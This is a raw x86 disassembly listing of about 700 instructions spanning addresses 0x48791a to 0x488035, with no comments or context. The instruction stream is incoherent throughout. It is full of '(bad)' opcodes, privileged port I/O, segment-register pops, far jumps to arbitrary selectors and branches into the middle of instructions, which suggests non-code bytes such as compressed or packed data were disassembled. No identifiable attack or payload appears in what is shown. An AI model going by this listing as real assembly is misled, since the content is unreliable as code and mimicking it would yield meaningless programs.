  48791a:	jns    0x4878d3
  48791c:	fsubr  DWORD PTR [edi-0x4ace15c2]
  487922:	or     ebx,DWORD PTR ds:0x1a07aac2
  487928:	pop    es
  487929:	xor    eax,0x4f8d2b09
  48792e:	mov    edi,0x62439a4c
  487933:	xchg   esi,eax
  487934:	cmp    DWORD PTR [esi],esi
  487936:	inc    eax
  487937:	call   0x5ec78ee8
  48793c:	inc    ecx
  48793d:	ret    
  48793e:	add    DWORD PTR [esi-0x21],edx
  487941:	iret   
  487942:	xlat   BYTE PTR ds:[ebx]
  487943:	stos   BYTE PTR es:[edi],al
  487944:	adc    dh,dl
  487946:	sbb    esi,0x6d468742
  48794c:	mov    ds:0x809f47b4,eax
  487951:	pop    eax
  487952:	pop    esp
  487953:	adc    BYTE PTR [edi+0x16],al
  487956:	lods   al,BYTE PTR ds:[esi]
  487957:	les    ebp,FWORD PTR [edx+0x330f77f7]
  48795d:	inc    eax
  48795e:	pop    eax
  48795f:	and    eax,0x639df6f
  487964:	xchg   esi,eax
  487965:	add    ch,BYTE PTR [edi+ebp*8-0x71]
  487969:	aas    
  48796a:	xor    ecx,edx
  48796c:	inc    edi
  48796d:	push   0x27ffff14
  487972:	stos   DWORD PTR es:[edi],eax
  487973:	aad    0x12
  487975:	push   ss
  487976:	fistp  WORD PTR [esi+0x5518d8b1]
  48797c:	iret   
  48797d:	add    edx,DWORD PTR [edi-0x60d0ecca]
  487983:	inc    edx
  487984:	jae    0x4879bd
  487986:	sbb    BYTE PTR [eax],ah
  487988:	mov    ebp,0x4466f12
  48798d:	pop    eax
  48798e:	inc    ebp
  48798f:	js     0x4879d0
  487991:	pop    ds
  487992:	inc    edi
  487993:	mov    ebx,DWORD PTR [eax+0x69]
  487996:	sbb    eax,0x1314b745
  48799b:	cdq    
  48799c:	test   eax,0x349f391f
  4879a1:	out    0x82,eax
  4879a3:	sbb    eax,0x2b770624
  4879a8:	loopne 0x48798b
  4879aa:	mov    dh,0x51
  4879ac:	push   ds
  4879ad:	add    edi,DWORD PTR [esi-0x4d]
  4879b0:	push   esi
  4879b1:	je     0x487a14
  4879b3:	lods   eax,DWORD PTR ds:[esi]
  4879b4:	dec    edi
  4879b5:	mov    edi,0xd02da0a7
  4879ba:	or     al,BYTE PTR [edi]
  4879bc:	iret   
  4879bd:	pop    edi
  4879be:	(bad)  
  4879bf:	add    ah,BYTE PTR [ecx-0x28]
  4879c2:	fild   WORD PTR [edi+ecx*4+0x48]
  4879c6:	push   ebp
  4879c7:	pusha  
  4879c8:	popf   
  4879c9:	out    dx,eax
  4879ca:	sar    BYTE PTR [bp+si],0x16
  4879ce:	push   ebx
  4879cf:	dec    edi
  4879d0:	push   edi
  4879d1:	je     0x4879ee
  4879d3:	pop    ds
  4879d4:	jmp    0x86800138
  4879d9:	lds    esp,FWORD PTR [eax+eiz*1]
  4879dc:	aaa    
  4879dd:	pop    es
  4879de:	js     0x487a19
  4879e0:	dec    esp
  4879e1:	lods   al,BYTE PTR ds:[esi]
  4879e2:	arpl   WORD PTR [edi+0x4c108488],bp
  4879e8:	mov    bh,0x27
  4879ea:	add    ah,BYTE PTR [ebx+0x25d7c2d2]
  4879f0:	add    al,0x42
  4879f2:	jle    0x48799b
  4879f4:	inc    ecx
  4879f5:	loopne 0x487a0d
  4879f7:	inc    esp
  4879f8:	push   edi
  4879f9:	lahf   
  4879fa:	inc    esi
  4879fb:	pop    edi
  4879fc:	bound  esi,QWORD PTR [eax+0x47e2b08a]
  487a02:	aas    
  487a03:	addr16 dec eax
  487a05:	sub    edx,eax
  487a07:	rcr    DWORD PTR [edi+0x42],1
  487a0a:	(bad)  
  487a0b:	or     eax,0x7ac06e7
  487a10:	xlat   BYTE PTR ds:[ebx]
  487a11:	inc    edx
  487a12:	das    
  487a13:	hlt    
  487a14:	and    BYTE PTR [edi-0x44],0x27
  487a18:	(bad)  
  487a19:	push   edi
  487a1a:	mov    ah,0x62
  487a1c:	(bad)  [esi+0x6f30a7ff]
  487a22:	dec    ebx
  487a23:	jb     0x487a28
  487a25:	inc    esi
  487a26:	inc    edi
  487a27:	dec    edi
  487a28:	xor    ecx,edi
  487a2a:	mov    bh,0x36
  487a2c:	loopne 0x487a97
  487a2e:	push   edi
  487a2f:	pop    edi
  487a30:	out    dx,eax
  487a31:	cmp    al,BYTE PTR [ecx+0x27a76d8f]
  487a37:	ja     0x487a85
  487a39:	xor    eax,0x6f323960
  487a3e:	xor    bl,BYTE PTR [eax-0x6d]
  487a41:	push   edx
  487a42:	or     al,0x7
  487a44:	pop    ds
  487a45:	xor    BYTE PTR [ebp-0x75],bl
  487a48:	inc    ecx
  487a49:	(bad)  
  487a4a:	ja     0x487a8f
  487a4c:	xor    BYTE PTR [ebp+0x1a],0x1b
  487a50:	daa    
  487a51:	pop    DWORD PTR [edi]
  487a53:	adc    BYTE PTR [ebx+0x78],ch
  487a56:	aaa    
  487a57:	and    dl,BYTE PTR [edi+0x7]
  487a5a:	gs lahf 
  487a5c:	dec    edx
  487a5d:	adc    DWORD PTR [edi],ecx
  487a5f:	(bad)  
  487a60:	mul    DWORD PTR [edi]
  487a62:	ss loope 0x487ac2
  487a65:	retf   
  487a66:	imul   ebp,ebx,0xffffff9f
  487a69:	cwde   
  487a6a:	jl     0x487ab1
  487a6c:	pop    eax
  487a6d:	fbstp  TBYTE PTR [edx]
  487a6f:	add    BYTE PTR [ecx-0x75],al
  487a72:	or     ah,BYTE PTR [ecx-0x5370b838]
  487a78:	or     DWORD PTR [eax],edi
  487a7a:	mov    ds:0x6f309739,al
  487a7f:	or     al,0x8d
  487a81:	ret    0xcf46
  487a84:	pop    edi
  487a85:	inc    ebp
  487a86:	sbb    BYTE PTR [eax+edx*4-0x6e],cl
  487a8a:	jmp    DWORD PTR [eax]
  487a8c:	(bad)  
  487a8d:	lods   eax,DWORD PTR ds:[esi]
  487a8e:	or     eax,0xb900efb7
  487a93:	sub    ch,BYTE PTR [edi+eax*2-0x51]
  487a97:	xor    al,0x88
  487a99:	adc    al,0xa
  487a9b:	cwde   
  487a9c:	xor    esp,DWORD PTR [edi-0x30]
  487a9f:	sub    dh,BYTE PTR [eax-0x3c8860f8]
  487aa5:	lods   eax,DWORD PTR es:[esi]
  487aa7:	nop
  487aa8:	pop    ss
  487aa9:	xchg   edi,eax
  487aaa:	xchg   edi,eax
  487aab:	or     BYTE PTR ds:0x970b561b,0x18
  487ab2:	xor    edx,DWORD PTR [edx+ecx*1]
  487ab5:	outs   dx,DWORD PTR ds:[esi]
  487ab6:	xlat   BYTE PTR ds:[ebx]
  487ab7:	mov    al,0xc8
  487ab9:	sbb    BYTE PTR [edi+ecx*1],cl
  487abc:	xlat   BYTE PTR ds:[ebx]
  487abd:	les    ecx,FWORD PTR [edx]
  487abf:	inc    esi
  487ac0:	xor    eax,DWORD PTR [edi-0x51]
  487ac3:	imul   esi,DWORD PTR [esp+ebp*4+0x12],0x4f
  487ac8:	xlat   BYTE PTR ds:[ebx]
  487ac9:	pusha  
  487aca:	test   al,0x36
  487acc:	pop    esi
  487acd:	retf   
  487ace:	aaa    
  487acf:	cmove  eax,eax
  487ad2:	add    BYTE PTR ds:0xc3a71f26,ah
  487ad8:	adc    edx,edx
  487ada:	pop    eax
  487adb:	das    
  487adc:	xor    DWORD PTR [edi+0x1a28421f],ecx
  487ae2:	daa    
  487ae3:	dec    edi
  487ae4:	rol    DWORD PTR [eax+0x34],1
  487ae7:	mov    dh,BYTE PTR [esi]
  487ae9:	inc    edi
  487aea:	inc    edi
  487aeb:	inc    ebx
  487aec:	setns  BYTE PTR [edx]
  487aef:	xchg   ebp,eax
  487af0:	push   ss
  487af1:	outs   dx,DWORD PTR ds:[esi]
  487af2:	jne    0x487aaf
  487af4:	pop    ecx
  487af5:	stos   DWORD PTR es:[edi],eax
  487af6:	out    dx,eax
  487af7:	(bad)  
  487afa:	xor    esi,DWORD PTR ds:0x1f3adb55
  487b00:	pop    ss
  487b01:	ja     0x487b33
  487b03:	aad    0xf1
  487b05:	adc    BYTE PTR [ecx+0x37],0x1f
  487b09:	mov    edi,0xa09eb1c4
  487b0e:	fistp  QWORD PTR [ebx]
  487b10:	scas   al,BYTE PTR es:[edi]
  487b11:	test   BYTE PTR [edx+0x44],dl
  487b14:	xor    DWORD PTR [bx+si],0xffffffb0
  487b18:	add    ch,bl
  487b1a:	and    al,BYTE PTR [edi-0x69]
  487b1d:	add    edx,DWORD PTR [esi+0x11]
  487b20:	hlt    
  487b21:	outs   dx,DWORD PTR ds:[esi]
  487b22:	(bad)  
  487b23:	dec    edi
  487b24:	test   eax,0x3601c840
  487b29:	test   eax,0x3f417c95
  487b2e:	inc    esi
  487b2f:	add    BYTE PTR [eax],dh
  487b31:	xor    al,0x68
  487b33:	sub    DWORD PTR [esi],0x67
  487b36:	xchg   edi,eax
  487b37:	iret   
  487b38:	mov    eax,ds:0x83848563
  487b3d:	out    dx,eax
  487b3e:	mov    al,ds:0x171488ab
  487b43:	jg     0x487b79
  487b45:	xchg   esi,eax
  487b46:	push   edx
  487b47:	daa    
  487b48:	scas   al,BYTE PTR es:[edi]
  487b49:	daa    
  487b4a:	addr16 out dx,al
  487b4c:	rcr    BYTE PTR [ebx],0x23
  487b4f:	xchg   DWORD PTR [esi+0x5c093977],edx
  487b55:	in     eax,dx
  487b56:	adc    BYTE PTR [edi],bh
  487b58:	xlat   BYTE PTR ds:[ebx]
  487b59:	leave  
  487b5a:	pop    edx
  487b5b:	aaa    
  487b5c:	(bad)  
  487b5d:	xchg   edi,eax
  487b5e:	pop    ss
  487b5f:	fsubr  DWORD PTR [ebp+0x41cf8aef]
  487b65:	(bad)  
  487b66:	ss mov edi,0xc9ab4389
  487b6c:	out    dx,eax
  487b6d:	pop    ds
  487b6e:	test   DWORD PTR [ebx+0x37],ecx
  487b71:	or     bh,ah
  487b73:	inc    edx
  487b74:	iret   
  487b75:	mov    ah,BYTE PTR [edi+0x13]
  487b78:	stos   DWORD PTR es:[edi],eax
  487b79:	aas    
  487b7a:	daa    
  487b7b:	pop    ss
  487b7c:	ds push esi
  487b7e:	ins    DWORD PTR es:[edi],dx
  487b7f:	lods   eax,DWORD PTR ds:[esi]
  487b80:	outs   dx,DWORD PTR ds:[esi]
  487b81:	fistp  WORD PTR [eax+0x3]
  487b84:	push   ss
  487b85:	add    edi,esp
  487b87:	fbld   TBYTE PTR [ebx+0x2793b691]
  487b8d:	mov    edi,0x286411e7
  487b92:	sbb    BYTE PTR [edi+0x46],bh
  487b95:	jmp    0x9b30:0x52942969
  487b9c:	jne    0x487b3f
  487b9e:	xor    eax,0xbf0f0fac
  487ba3:	mov    eax,ds:0x17555888
  487ba8:	aas    
  487ba9:	push   es
  487baa:	mov    esp,0x1f5f012b
  487baf:	addr16 inc edi
  487bb1:	mov    cl,0xa
  487bb3:	lods   al,BYTE PTR ds:[esi]
  487bb4:	push   edi
  487bb5:	mov    bh,0x41
  487bb7:	mov    bh,BYTE PTR [esi+0x675f6c55]
  487bbd:	fwait
  487bbe:	inc    ebx
  487bbf:	aaa    
  487bc0:	popa   
  487bc1:	adc    DWORD PTR [ecx+0xb],eax
  487bc4:	out    dx,eax
  487bc5:	mov    WORD PTR [ebp+0x378f65f8],cs
  487bcb:	pop    es
  487bcc:	pop    edx
  487bcd:	and    eax,0xfdf9a14
  487bd2:	(bad)  [edi]
  487bd4:	outs   dx,BYTE PTR ds:[esi]
  487bd5:	dec    ebp
  487bd6:	aaa    
  487bd7:	add    bh,BYTE PTR [ebx]
  487bd9:	ja     0x487c48
  487bdb:	xchg   ebp,eax
  487bdc:	adc    BYTE PTR [ebp+0x27],0xbf
  487be0:	dec    edi
  487be1:	add    DWORD PTR [edx-0x66],0x1c
  487be5:	inc    esi
  487be6:	lgs    esp,FWORD PTR [esi]
  487be9:	popa   
  487bea:	mov    ah,0x43
  487bec:	dec    edi
  487bed:	out    0x65,eax
  487bef:	lods   eax,DWORD PTR ds:[esi]
  487bf0:	shl    BYTE PTR [ecx],cl
  487bf2:	jg     0x487b7f
  487bf4:	and    dh,cl
  487bf6:	enter  0x27f1,0x7b
  487bfa:	xor    bh,BYTE PTR [esi+0x20]
  487bfd:	inc    edi
  487bfe:	stos   BYTE PTR es:[edi],al
  487bff:	repz jnp 0x487c21
  487c02:	inc    esi
  487c03:	in     al,0x92
  487c05:	imul   eax,DWORD PTR [ecx+0x3f],0x74383644
  487c0c:	dec    ecx
  487c0d:	lods   eax,DWORD PTR ds:[esi]
  487c0e:	inc    ebx
  487c0f:	fild   WORD PTR [eax]
  487c11:	js     0x487bc2
  487c13:	xor    eax,0x5ae338cf
  487c18:	rcl    BYTE PTR [esi],cl
  487c1a:	loope  0x487c23
  487c1c:	neg    DWORD PTR [esi]
  487c1e:	cmp    DWORD PTR [ebx+0x5701e156],ecx
  487c24:	(bad)  
  487c25:	retf   
  487c26:	dec    ebx
  487c27:	ror    BYTE PTR [edx],0xa
  487c2a:	inc    edi
  487c2b:	mov    dl,0xb0
  487c2d:	or     BYTE PTR [esi-0x5b70cea9],ah
  487c33:	sbb    DWORD PTR [eax],0xfffffffb
  487c36:	cmp    ebx,DWORD PTR [edi]
  487c38:	pop    esi
  487c39:	xor    al,0xb1
  487c3b:	js     0x487be8
  487c3d:	rcl    bh,1
  487c3f:	xchg   ebx,eax
  487c40:	inc    edx
  487c41:	mov    cl,0xd
  487c43:	push   ecx
  487c44:	or     bh,BYTE PTR [edi]
  487c46:	and    eax,DWORD PTR [esi-0x31]
  487c49:	or     DWORD PTR [esi],ebp
  487c4b:	mov    WORD PTR [edx+0x4f],ss
  487c4e:	or     dl,BYTE PTR [edi+0x30]
  487c51:	aad    0x0
  487c53:	push   ss
  487c54:	pop    esi
  487c55:	iret   
  487c56:	xor    eax,0x2b196ade
  487c5b:	inc    edi
  487c5c:	jae    0x487cb5
  487c5e:	xchg   edi,eax
  487c5f:	dec    edx
  487c60:	sbb    eax,0xf43d783
  487c65:	fwait
  487c66:	push   ebp
  487c67:	push   ebx
  487c68:	aaa    
  487c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  487c6a:	pop    ss
  487c6b:	xor    ecx,DWORD PTR [edi]
  487c6d:	push   ebx
  487c6e:	shr    BYTE PTR [eax+0x23815f89],0x3
  487c75:	adc    DWORD PTR [edi+0x61285897],0x44
  487c7c:	ja     0x487c3d
  487c7e:	jmp    0x487cd8
  487c80:	mov    al,0x58
  487c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487c83:	outs   dx,DWORD PTR ds:[esi]
  487c84:	test   esp,0xf0d220a
  487c8a:	xlat   BYTE PTR ds:[ebx]
  487c8b:	mov    ah,0x31
  487c8d:	pop    ebp
  487c8e:	aam    0x8f
  487c90:	xor    ebp,DWORD PTR [ebx+0x4d4a4236]
  487c96:	cbw    
  487c98:	push   edi
  487c99:	xor    DWORD PTR [edi+0x4a],edi
  487c9c:	fst    DWORD PTR [edi+0x273f1fb1]
  487ca2:	aas    
  487ca3:	ss jl  0x487cb9
  487ca6:	(bad)  
  487ca8:	inc    edx
  487ca9:	inc    ecx
  487caa:	sbb    BYTE PTR [ebx+0x5f276b03],ch
  487cb0:	jecxz  0x487c6a
  487cb2:	loope  0x487cd1
  487cb4:	lahf   
  487cb5:	sar    DWORD PTR [edi+0x34],cl
  487cb8:	dec    edi
  487cb9:	mov    ch,0x76
  487cbb:	sbb    eax,0x314f870f
  487cc0:	pop    ds
  487cc1:	stos   BYTE PTR es:[edi],al
  487cc2:	push   ebp
  487cc3:	xchg   ebx,eax
  487cc4:	jno    0x487d01
  487cc6:	aaa    
  487cc7:	lds    edi,FWORD PTR [bp+si-0x53a0]
  487ccc:	daa    
  487ccd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487cce:	xor    BYTE PTR [edx+eax*1+0x58],0x17
  487cd3:	ss mov eax,0xfdfc1ac
  487cd9:	pop    ss
  487cda:	add    al,0x8c
  487cdc:	push   0xb557c745
  487ce1:	imul   edx,edx,0xffffffba
  487ce4:	daa    
  487ce5:	iret   
  487ce6:	cmp    BYTE PTR [edi],ch
  487ce8:	and    esi,DWORD PTR [esi+0x738c960]
  487cee:	aas    
  487cef:	mov    eax,ds:0x3f0d63e1
  487cf4:	pop    edi
  487cf5:	aas    
  487cf6:	shl    esp,0x88
  487cf9:	in     al,0x46
  487cfb:	add    BYTE PTR [ebx],dh
  487cfd:	cmp    BYTE PTR [edi],al
  487cff:	push   ds
  487d00:	sbb    al,BYTE PTR [esi+0x6c]
  487d03:	aas    
  487d04:	aas    
  487d05:	xor    al,BYTE PTR [eax]
  487d07:	xor    eax,ecx
  487d09:	mov    ds:0x73348e4,al
  487d0e:	mov    ecx,0x274ae264
  487d13:	inc    esp
  487d14:	inc    ebx
  487d15:	xor    DWORD PTR [esi+eax*4-0xa0cefd],ebp
  487d1c:	jo     0x487ce7
  487d1e:	add    eax,0x34303432
  487d23:	test   BYTE PTR [esi],dl
  487d25:	mov    bh,0xd6
  487d27:	aas    
  487d28:	aaa    
  487d29:	cmp    esp,DWORD PTR [edx+0x17772d75]
  487d2f:	mov    bh,0x36
  487d31:	inc    edi
  487d32:	add    dl,BYTE PTR [esi]
  487d34:	xchg   esp,eax
  487d35:	sbb    BYTE PTR [edi-0x4797bbc8],al
  487d3b:	dec    edi
  487d3c:	dec    edi
  487d3d:	das    
  487d3e:	ins    DWORD PTR es:[edi],dx
  487d3f:	popa   
  487d40:	or     eax,0x15074f69
  487d45:	pop    eax
  487d46:	mov    bh,0xd6
  487d48:	push   DWORD PTR [edi-0x7d3ea599]
  487d4e:	and    edi,0x57
  487d51:	call   FWORD PTR [eax+0x700a8e4]
  487d57:	xor    dh,BYTE PTR [ecx]
  487d59:	pop    edx
  487d5a:	leave  
  487d5b:	add    al,0xe3
  487d5d:	fwait
  487d5e:	mov    bh,0x34
  487d60:	bound  ecx,QWORD PTR [ebp+0x5a]
  487d63:	add    al,0xc7
  487d65:	out    0x31,eax
  487d67:	sub    ch,al
  487d69:	(bad)  
  487d6a:	ror    BYTE PTR [edi-0x78a72351],cl
  487d70:	sub    DWORD PTR [edi-0x549f3f39],0xeb372758
  487d7a:	stos   BYTE PTR es:[edi],al
  487d7b:	mov    dl,0x8e
  487d7d:	xacquire xchg DWORD PTR [edi],esi
  487d80:	(bad)  
  487d81:	sub    BYTE PTR es:[ecx],dl
  487d84:	pop    ds
  487d85:	dec    DWORD PTR [ebx-0x61f9aad7]
  487d8b:	xchg   DWORD PTR [edi],ecx
  487d8d:	data16 (bad) 
  487d8f:	push   0x38
  487d91:	jbe    0x487d92
  487d93:	arpl   WORD PTR [ebx],si
  487d95:	scas   eax,DWORD PTR es:[edi]
  487d96:	or     eax,0xc727006b
  487d9b:	push   ss
  487d9c:	pop    eax
  487d9d:	add    al,0xa4
  487d9f:	add    DWORD PTR [edi-0x61],ebp
  487da2:	lods   al,BYTE PTR ds:[esi]
  487da3:	arpl   WORD PTR [eax],dx
  487da5:	sub    esi,DWORD PTR [edi]
  487da7:	scas   eax,DWORD PTR es:[edi]
  487da8:	data16 ins BYTE PTR es:[edi],dx
  487daa:	aam    0xa
  487dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487dad:	iret   
  487dae:	pop    ss
  487daf:	test   DWORD PTR [ecx+esi*4],eax
  487db2:	es inc esi
  487db4:	out    dx,eax
  487db5:	xchg   esp,eax
  487db6:	shl    BYTE PTR [eax+0x3f],1
  487db9:	mov    eax,DWORD PTR [ebx+0x67]
  487dbc:	not    DWORD PTR [esi]
  487dbe:	adc    esp,DWORD PTR [ebp+0x75e7461c]
  487dc4:	or     DWORD PTR [ebx-0x810d116],esp
  487dca:	adc    eax,0x4470b1c0
  487dcf:	sbb    edi,0x6
  487dd2:	pop    ds
  487dd3:	sub    ecx,DWORD PTR [eax]
  487dd5:	aas    
  487dd6:	sub    dh,BYTE PTR [bx+di]
  487dd9:	mov    WORD PTR [edx+0x5],es
  487ddc:	pop    edi
  487ddd:	das    
  487dde:	out    0x8a,eax
  487de0:	add    DWORD PTR [eax+0x5a],edi
  487de3:	mov    edi,0x35a8d46f
  487de8:	imul   eax,DWORD PTR [edi+ebp*8-0x11],0xa2c501d0
  487df0:	dec    edi
  487df1:	(bad)  
  487df2:	xor    dh,al
  487df4:	or     BYTE PTR [ecx+eax*8+0x58228f9b],ah
  487dfb:	lds    edx,FWORD PTR [edx+0x26]
  487dfe:	xor    al,0x87
  487e00:	aas    
  487e01:	or     BYTE PTR [esi+0x71],dl
  487e04:	(bad)  
  487e05:	cmp    bl,BYTE PTR [edi+0x581e36bf]
  487e0b:	ret    
  487e0c:	jbe    0x22d9caad
  487e12:	div    edi
  487e14:	inc    edx
  487e15:	iret   
  487e16:	lods   eax,DWORD PTR ds:[esi]
  487e17:	dec    ebx
  487e18:	rcr    edx,1
  487e1a:	out    0x4f,eax
  487e1c:	fild   WORD PTR [ebp-0x79]
  487e1f:	loop   0x487e55
  487e21:	or     BYTE PTR [ebp+0xeb56eef],al
  487e27:	lods   al,BYTE PTR ds:[esi]
  487e28:	call   0x41a87d80
  487e2d:	rcl    DWORD PTR [edx],cl
  487e2f:	pop    es
  487e30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487e32:	inc    ebx
  487e33:	pop    edx
  487e34:	mov    DWORD PTR [ebp-0x15],esi
  487e37:	mov    edi,0x2d869f9f
  487e3c:	in     al,0x68
  487e3e:	inc    edi
  487e3f:	xor    dl,BYTE PTR [edi-0x6ca279bc]
  487e45:	cmp    ebp,DWORD PTR [edi]
  487e47:	xor    ecx,edi
  487e49:	mov    edi,0xd0118b08
  487e4e:	daa    
  487e4f:	pop    ds
  487e50:	stos   DWORD PTR es:[edi],eax
  487e51:	push   ebx
  487e52:	stos   DWORD PTR es:[edi],eax
  487e53:	mov    edi,0xb6b667c7
  487e58:	or     ecx,DWORD PTR [edi-0x25]
  487e5b:	mov    bh,0x2f
  487e5d:	push   ebx
  487e5e:	jmp    0x487e62
  487e60:	adc    al,bl
  487e62:	pop    ss
  487e63:	ja     0x487e4d
  487e65:	pop    eax
  487e66:	mov    al,0x2
  487e68:	dec    DWORD PTR [edi+0x4a45ae1f]
  487e6e:	xlat   BYTE PTR ds:[ebx]
  487e6f:	daa    
  487e70:	iret   
  487e71:	das    
  487e72:	stos   DWORD PTR es:[edi],eax
  487e73:	and    eax,DWORD PTR [ecx+ebp*4]
  487e76:	out    0x7f,eax
  487e78:	les    esp,FWORD PTR [ecx+0x6f970955]
  487e7e:	add    DWORD PTR [ebx],0x388f224e
  487e84:	je     0x487ece
  487e86:	test   BYTE PTR [eax],bl
  487e88:	inc    edi
  487e89:	xchg   edi,eax
  487e8a:	sbb    eax,0xafbad62b
  487e8f:	push   edi
  487e90:	jg     0x487e7c
  487e92:	and    BYTE PTR [ecx-0x58],al
  487e95:	daa    
  487e96:	jmp    FWORD PTR [eax+0x5]
  487e99:	xchg   ecx,eax
  487e9a:	bound  ecx,QWORD PTR [edi]
  487e9c:	(bad)
  487ea0:	add    ch,BYTE PTR [edi]
  487ea2:	(bad)  
  487ea3:	out    0x75,eax
  487ea5:	imul   ebx,DWORD PTR ds:0x6f573618,0x81daa8c0
  487eaf:	scas   eax,DWORD PTR es:[edi]
  487eb0:	scas   eax,DWORD PTR es:[edi]
  487eb1:	xor    eax,esp
  487eb3:	inc    ecx
  487eb4:	pop    ds
  487eb5:	mov    ds:0xb06a5f9f,eax
  487eba:	data16 (bad) 
  487ebc:	iret   
  487ebd:	fmul   DWORD PTR es:[edx]
  487ec0:	mov    BYTE PTR [ebp+0xf],dl
  487ec3:	pop    edi
  487ec4:	call   esp
  487ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  487ec7:	mov    eax,ds:0x630f33ed
  487ecc:	inc    esi
  487ecd:	add    bh,BYTE PTR [ecx]
  487ecf:	loopne 0x487eb8
  487ed1:	aaa    
  487ed2:	ror    BYTE PTR [edx-0x1d],1
  487ed5:	mov    DWORD PTR [ebx+0x68c02ef],ecx
  487edb:	ins    BYTE PTR es:[edi],dx
  487edc:	dec    edi
  487edd:	inc    DWORD PTR [edi+0x58]
  487ee0:	adc    esi,DWORD PTR [ecx-0x56a8404a]
  487ee6:	jno    0x487f2d
  487ee8:	xor    eax,0x5b43574e
  487eed:	mov    bh,0x4e
  487eef:	bound  ecx,QWORD PTR ds:0x6a0b076f
  487ef5:	stos   BYTE PTR es:[edi],al
  487ef6:	lea    eax,[edi-0x29bb50d5]
  487efc:	inc    ebp
  487efd:	and    dh,BYTE PTR [ecx+0x5f]
  487f00:	das    
  487f01:	shl    DWORD PTR [edi+eax*8-0x56],1
  487f05:	(bad)  
  487f06:	arpl   WORD PTR [edx],si
  487f08:	inc    DWORD PTR [eax+esi*4-0x5a387ac8]
  487f0f:	and    eax,0x87fbec02
  487f14:	inc    edi
  487f15:	mov    edi,DWORD PTR ds:0x6b4741f7
  487f1b:	xchg   DWORD PTR [edi],esi
  487f1d:	push   esi
  487f1e:	sub    BYTE PTR [edi],0x9
  487f21:	ret    
  487f22:	inc    edi
  487f23:	sbb    ch,BYTE PTR [edx]
  487f25:	adc    al,0xa1
  487f27:	(bad)  
  487f28:	rcl    DWORD PTR es:[esi-0x4f],0x70
  487f2d:	add    bh,bh
  487f2f:	inc    edi
  487f30:	pop    eax
  487f31:	pop    ebx
  487f32:	enter  0x45c9,0x30
  487f36:	scas   eax,DWORD PTR es:[edi]
  487f37:	sub    bh,BYTE PTR [eax+eax*2]
  487f3a:	imul   ecx,DWORD PTR [edi],0xffffff83
  487f3d:	xchg   DWORD PTR [edi-0x1852d6aa],eax
  487f43:	mov    edi,0xd5152061
  487f48:	pop    edi
  487f49:	inc    edi
  487f4a:	loop   0x487f10
  487f4c:	push   ebp
  487f4d:	das    
  487f4e:	inc    ebx
  487f4f:	lahf   
  487f50:	xchg   edi,eax
  487f51:	push   es
  487f52:	in     al,dx
  487f53:	xor    al,0x2
  487f55:	ja     0x487fb6
  487f57:	ret    0x3bb5
  487f5a:	mov    ch,0xb7
  487f5c:	xor    al,0x27
  487f5e:	aaa    
  487f5f:	xor    al,0x41
  487f61:	add    DWORD PTR [edi+ebp*1+0x295d423f],ebp
  487f68:	fs call 0x6688:0xd43f3847
  487f70:	or     BYTE PTR [edi+0x35],bh
  487f73:	lahf   
  487f74:	xchg   edx,eax
  487f75:	iret   
  487f76:	pop    edx
  487f77:	(bad)  
  487f79:	aaa    
  487f7a:	inc    ebp
  487f7b:	pop    ecx
  487f7c:	pop    es
  487f7d:	rol    BYTE PTR ds:0xcaab4eff,0xc0
  487f84:	stos   BYTE PTR es:[edi],al
  487f85:	aaa    
  487f86:	(bad)  
  487f87:	ins    BYTE PTR es:[edi],dx
  487f88:	xor    al,dh
  487f8a:	add    DWORD PTR [edi-0x7a3de0cd],ebp
  487f90:	sbb    al,BYTE PTR [ecx]
  487f92:	lahf   
  487f93:	mov    edx,0xb8a6055
  487f98:	lahf   
  487f99:	xor    edi,edi
  487f9b:	rcr    DWORD PTR [edx],cl
  487f9d:	sbb    al,0x8
  487f9f:	pop    edi
  487fa0:	test   eax,0xf7ad34d2
  487fa5:	inc    edi
  487fa6:	aaa    
  487fa7:	rol    ecx,cl
  487fa9:	add    DWORD PTR [ecx+ecx*1+0x55898757],ecx
  487fb0:	push   ebx
  487fb1:	leave  
  487fb2:	aaa    
  487fb3:	xor    ebx,DWORD PTR [edi]
  487fb5:	mov    ds:0xa745a0d6,eax
  487fba:	iret   
  487fbb:	push   edi
  487fbc:	xchg   edi,eax
  487fbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  487fbe:	adc    DWORD PTR [ebx+esi*1+0x27],ebx
  487fc2:	dec    ebx
  487fc3:	sbb    esi,DWORD PTR [ecx+0x3]
  487fc6:	sbb    BYTE PTR [edi+0x3a84485f],bh
  487fcc:	shl    BYTE PTR [edi+0x28b7027],cl
  487fd2:	fbstp  TBYTE PTR [ebx]
  487fd4:	xchg   edi,eax
  487fd5:	push   esi
  487fd6:	in     eax,dx
  487fd7:	inc    esi
  487fd8:	sub    dl,BYTE PTR [esi-0x21]
  487fdb:	pop    ss
  487fdc:	dec    edi
  487fdd:	sub    al,0x32
  487fdf:	xor    BYTE PTR [esi],al
  487fe1:	xchg   edi,ecx
  487fe3:	ffree  st(6)
  487fe5:	sbb    WORD PTR [edi],di
  487fe8:	iret   
  487fe9:	jae    0x487fc6
  487feb:	and    ebp,esp
  487fed:	mov    edx,0x3907f376
  487ff2:	das    
  487ff3:	pop    ss
  487ff4:	xchg   DWORD PTR [esi+0x1],esi
  487ff7:	mov    DWORD PTR [edi+0x34],0x24b2e03c
  487ffe:	pop    ds
  487fff:	jb     0x488018
  488001:	add    eax,0x67419ad0
  488006:	(bad)  
  488007:	adc    BYTE PTR [eax+0x5f],bh
  48800a:	or     ah,bl
  48800c:	(bad)  
  48800d:	loope  0x48804d
  48800f:	push   ss
  488010:	jmp    0xb1b5:0x36539f77
  488017:	xchg   esi,eax
  488018:	outs   dx,BYTE PTR ds:[esi]
  488019:	xlat   BYTE PTR ds:[ebx]
  48801a:	addr16 pop edi
  48801c:	in     al,0xe9
  48801e:	push   esi
  48801f:	ret    
  488020:	jg     0x488091
  488022:	xor    dh,BYTE PTR [edi]
  488024:	push   esi
  488025:	stos   DWORD PTR es:[edi],eax
  488026:	and    BYTE PTR [ecx-0x6f13a9f9],dh
  48802c:	(bad)
  488030:	add    BYTE PTR [ecx+eax*2+0x4f],al
  488034:	push   edi
  488035:	enter  0x5725,0x42
